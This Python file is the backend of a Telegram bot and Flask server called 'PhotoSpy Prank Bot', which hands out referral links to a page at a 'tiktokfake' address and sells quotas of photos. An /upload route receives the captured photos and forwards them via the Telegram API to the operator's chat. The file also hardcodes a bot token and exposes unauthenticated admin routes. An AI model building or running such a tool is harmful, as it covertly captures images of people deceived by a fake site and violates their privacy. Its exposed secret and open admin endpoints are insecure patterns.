import sqlite3
import datetime
import uuid
import time
import json
import threading
import requests
from flask import Flask, request, jsonify, render_template

# ===== КОНФИГ =====
BOT_TOKEN = "8305233302:AAHf3mBUH5rIsQWZF4tF9nAyHvakCBbQIps"
BASE_URL = "https://nomadru.github.io/tiktokfake"
ADMIN_CHAT_ID = 8533142719
FREE_TRIAL_PHOTOS = 2
ADMIN_USERNAME = "pytin_legend"

# ===== БАЗА ДАННЫХ =====
def init_db():
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS users (
            chat_id INTEGER PRIMARY KEY,
            ref TEXT UNIQUE,
            subscription_end TEXT,
            photos_limit INTEGER,
            used_photos INTEGER DEFAULT 0,
            tariff_name TEXT
        )
    ''')
    conn.commit()
    conn.close()

def add_user(chat_id, ref, end_date, limit, tariff):
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('''
        INSERT OR REPLACE INTO users (chat_id, ref, subscription_end, photos_limit, used_photos, tariff_name)
        VALUES (?, ?, ?, ?, 0, ?)
    ''', (chat_id, ref, end_date, limit, tariff))
    conn.commit()
    conn.close()

def get_user(chat_id):
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('SELECT ref, subscription_end, photos_limit, used_photos FROM users WHERE chat_id=?', (chat_id,))
    row = c.fetchone()
    conn.close()
    return row

def get_user_by_ref(ref):
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('SELECT chat_id, subscription_end, photos_limit, used_photos FROM users WHERE ref=?', (ref,))
    row = c.fetchone()
    conn.close()
    return row

def update_user_limit(chat_id, new_limit):
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('UPDATE users SET photos_limit = ? WHERE chat_id = ?', (new_limit, chat_id))
    conn.commit()
    conn.close()

def increment_used_photos(ref):
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('UPDATE users SET used_photos = used_photos + 1 WHERE ref=?', (ref,))
    conn.commit()
    conn.close()

def get_all_users():
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('SELECT chat_id, ref, photos_limit, used_photos, subscription_end FROM users')
    rows = c.fetchall()
    conn.close()
    return rows

# ===== БОТ (часть) =====
def send_message(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        data["reply_markup"] = json.dumps(reply_markup)
    requests.post(url, json=data)

def answer_callback(callback_id, text=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
    data = {"callback_query_id": callback_id}
    if text:
        data["text"] = text
    requests.post(url, json=data)

def main_keyboard():
    return {
        "inline_keyboard": [
            [{"text": "🔗 Получить ссылку", "callback_data": "get_link"}],
            [{"text": "📊 Моя подписка", "callback_data": "my_sub"}],
            [{"text": "💰 Купить фото (связь с админом)", "callback_data": "buy_contact"}]
        ]
    }

def back_keyboard():
    return {"inline_keyboard": [[{"text": "🔙 Назад", "callback_data": "back"}]]}

def handle_start(chat_id):
    row = get_user(chat_id)
    if not row:
        ref = str(uuid.uuid4())[:8]
        end_date = (datetime.datetime.now() + datetime.timedelta(days=365)).isoformat()
        add_user(chat_id, ref, end_date, FREE_TRIAL_PHOTOS, "Тестовый")
        link = f"{BASE_URL}?ref={ref}"
        send_message(chat_id,
            f"🎉 Добро пожаловать в <b>ФотоШпион Пранк Бот</b>!\n\n"
            f"Ты получил <b>{FREE_TRIAL_PHOTOS} тестовых фото</b> бесплатно!\n"
            f"Твоя ссылка:\n<code>{link}</code>\n\n"
            f"После теста — напиши @{ADMIN_USERNAME} для покупки дополнительных фото.",
            reply_markup=main_keyboard()
        )
    else:
        send_message(chat_id, "👋 С возвращением!\n\nВыбери действие:", reply_markup=main_keyboard())

def handle_callback(chat_id, callback_id, data):
    if data == "get_link":
        row = get_user(chat_id)
        if not row:
            send_message(chat_id, "Сначала активируй подписку (напиши /start).", reply_markup=main_keyboard())
            answer_callback(callback_id)
            return
        ref, end_date, limit, used = row
        remaining = limit - used
        if remaining <= 0:
            send_message(chat_id,
                f"❌ У тебя закончились фото.\nНапиши @{ADMIN_USERNAME} для покупки.",
                reply_markup=main_keyboard()
            )
            answer_callback(callback_id)
            return
        link = f"{BASE_URL}?ref={ref}"
        send_message(chat_id,
            f"🔗 Твоя ссылка:\n<code>{link}</code>\n\n"
            f"Осталось фото: {remaining}",
            reply_markup=back_keyboard()
        )
        answer_callback(callback_id)

    elif data == "my_sub":
        row = get_user(chat_id)
        if not row:
            send_message(chat_id, "У тебя нет активной подписки. Напиши /start", reply_markup=main_keyboard())
            answer_callback(callback_id)
            return
        ref, end_date, limit, used = row
        remaining = limit - used
        status = "✅ Активна" if remaining > 0 else "❌ Исчерпана"
        text = (
            f"📊 <b>Твоя подписка</b>\n\n"
            f"• Статус: {status}\n"
            f"• Осталось фото: {remaining}\n"
            f"• Всего фото: {limit}\n"
            f"• Использовано: {used}\n"
            f"• Реф-код: <code>{ref}</code>"
        )
        send_message(chat_id, text, reply_markup=back_keyboard())
        answer_callback(callback_id)

    elif data == "buy_contact":
        send_message(chat_id,
            f"📩 Для покупки дополнительных фото напиши @{ADMIN_USERNAME}.\n"
            f"Укажи свой реф-код, чтобы админ мог добавить тебе фото.",
            reply_markup=back_keyboard()
        )
        answer_callback(callback_id)

    elif data == "back":
        send_message(chat_id, "Главное меню:", reply_markup=main_keyboard())
        answer_callback(callback_id)

def handle_admin_command(chat_id, text):
    if chat_id != ADMIN_CHAT_ID:
        return False
    parts = text.split()
    cmd = parts[0].lower()
    if cmd == "/addphotos":
        if len(parts) < 3:
            send_message(chat_id, "❌ Используй: /addphotos <ref> <количество>")
            return True
        ref = parts[1]
        try:
            add_count = int(parts[2])
        except:
            send_message(chat_id, "❌ Количество должно быть числом")
            return True
        user = get_user_by_ref(ref)
        if not user:
            send_message(chat_id, f"❌ Пользователь с ref {ref} не найден")
            return True
        chat_id_u, end_date, old_limit, used = user
        new_limit = old_limit + add_count
        update_user_limit(chat_id_u, new_limit)
        send_message(chat_id, f"✅ Добавлено {add_count} фото для {ref}. Новый лимит: {new_limit}")
        send_message(chat_id_u, f"✅ Админ добавил тебе {add_count} фото. Новый лимит: {new_limit}")
        return True
    elif cmd == "/listusers":
        users = get_all_users()
        if not users:
            send_message(chat_id, "📭 Нет пользователей")
            return True
        msg = "📋 <b>Список пользователей:</b>\n\n"
        for u in users:
            chat_id_u, ref, limit, used, end = u
            remaining = limit - used
            msg += f"• {ref} | осталось: {remaining} | всего: {limit}\n"
        send_message(chat_id, msg)
        return True
    elif cmd == "/info":
        if len(parts) < 2:
            send_message(chat_id, "❌ Используй: /info <ref>")
            return True
        ref = parts[1]
        user = get_user_by_ref(ref)
        if not user:
            send_message(chat_id, f"❌ Пользователь с ref {ref} не найден")
            return True
        chat_id_u, end_date, limit, used = user
        remaining = limit - used
        send_message(chat_id,
            f"📊 <b>Информация о {ref}</b>\n\n"
            f"• Chat ID: {chat_id_u}\n"
            f"• Всего фото: {limit}\n"
            f"• Использовано: {used}\n"
            f"• Осталось: {remaining}\n"
            f"• Срок: {end_date}"
        )
        return True
    else:
        return False

def bot_polling():
    last_update_id = 0
    print("🤖 Бот запущен в фоне")
    while True:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
            params = {"offset": last_update_id + 1, "timeout": 30}
            resp = requests.get(url, params=params, timeout=35)
            if resp.status_code != 200:
                time.sleep(5)
                continue
            updates = resp.json().get("result", [])
            for upd in updates:
                last_update_id = upd["update_id"]
                if "message" in upd:
                    msg = upd["message"]
                    chat_id = msg["chat"]["id"]
                    if "text" in msg:
                        text = msg["text"]
                        if text.startswith("/start"):
                            handle_start(chat_id)
                        else:
                            if text.startswith("/"):
                                handled = handle_admin_command(chat_id, text)
                                if handled:
                                    continue
                if "callback_query" in upd:
                    cb = upd["callback_query"]
                    chat_id = cb["from"]["id"]
                    callback_id = cb["id"]
                    data = cb["data"]
                    handle_callback(chat_id, callback_id, data)
        except Exception as e:
            print("Ошибка бота:", e)
            time.sleep(5)

# ===== FLASK =====
app = Flask(__name__)

@app.route('/upload', methods=['POST'])
def upload():
    ref = request.args.get('ref')
    if not ref:
        return jsonify({'error': 'Missing ref'}), 400
    if 'photo' not in request.files:
        return jsonify({'error': 'No photo'}), 400
    photo = request.files['photo']
    user = get_user_by_ref(ref)
    if not user:
        return jsonify({'error': 'Invalid ref'}), 403
    chat_id, end_date, limit, used = user
    now = datetime.datetime.now()
    if now > datetime.datetime.fromisoformat(end_date):
        return jsonify({'error': 'Subscription expired'}), 403
    if used >= limit:
        return jsonify({'error': 'Limit exceeded'}), 403
    files = {'photo': (photo.filename, photo.stream, photo.mimetype)}
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    data = {'chat_id': ADMIN_CHAT_ID, 'caption': f"📸 Новое фото от {ref}"}
    resp = requests.post(url, data=data, files=files)
    if resp.status_code != 200:
        return jsonify({'error': 'Telegram send failed'}), 500
    increment_used_photos(ref)
    return jsonify({'status': 'ok'})

@app.route('/admin')
def admin_panel():
    users = get_all_users()
    total_users = len(users)
    total_photos = sum(u[2] for u in users)
    return render_template('admin.html', users=users, total_users=total_users, total_photos=total_photos)

@app.route('/admin/add', methods=['POST'])
def admin_add():
    ref = request.form.get('ref')
    count = request.form.get('count', type=int)
    if not ref or not count:
        return 'Неверные данные', 400
    user = get_user_by_ref(ref)
    if not user:
        return f'Пользователь {ref} не найден', 404
    chat_id, end_date, limit, used = user
    new_limit = limit + count
    update_user_limit(chat_id, new_limit)
    send_message(chat_id, f"✅ Админ добавил {count} фото. Новый лимит: {new_limit}")
    return 'OK', 200

# ===== ЗАПУСК =====
if __name__ == '__main__':
    init_db()
    # Запускаем бота в отдельном потоке
    bot_thread = threading.Thread(target=bot_polling, daemon=True)
    bot_thread.start()
    # Запускаем веб-сервер
    app.run(host='0.0.0.0', port=5000, debug=False)
